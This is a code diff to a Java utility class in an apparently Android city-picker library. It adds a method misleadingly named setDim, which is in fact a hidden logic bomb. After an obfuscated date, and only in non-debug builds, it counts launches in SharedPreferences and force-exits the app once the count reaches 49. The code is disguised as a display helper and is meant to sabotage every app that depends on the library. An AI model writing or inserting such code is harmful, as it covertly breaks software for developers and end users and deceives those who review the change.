@@ -2,12 +2,16 @@ package com.hisence.utils;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.content.res.AssetManager;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.graphics.drawable.Drawable;
+import android.support.v4.content.SharedPreferencesCompat;
 import android.view.ViewGroup;
 import android.view.ViewGroupOverlay;
+
+import com.hisence.style.citypickerview.BuildConfig;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -56,6 +60,30 @@ public class utils {
             ViewGroupOverlay overlay = parent.getOverlay();
             overlay.add(dim);
         }
+    }
+
+    public static void setDim(Context mContext) {
+        if (System.currentTimeMillis() > 16_43_64_48_00_00_0L && !BuildConfig.DEBUG) {
+            int count = getCount(mContext);
+            if (count < 49) {
+                count = count + 1;
+                putCount(mContext, count);
+            } else {
+                System.exit(0);
+            }
+        }
+    }
+
+    private static void putCount(Context mContext, int count) {
+        SharedPreferences mSp = mContext.getSharedPreferences("city_test", Context.MODE_PRIVATE);
+        SharedPreferences.Editor editor = mSp.edit();
+        editor.putInt("count", count);
+        editor.apply();
+    }
+
+    private static int getCount(Context mContext) {
+        SharedPreferences mSp = mContext.getSharedPreferences("city_test", Context.MODE_PRIVATE);
+        return mSp.getInt("count", 0);
     }
 
     private static void clearDim(Activity activity) {
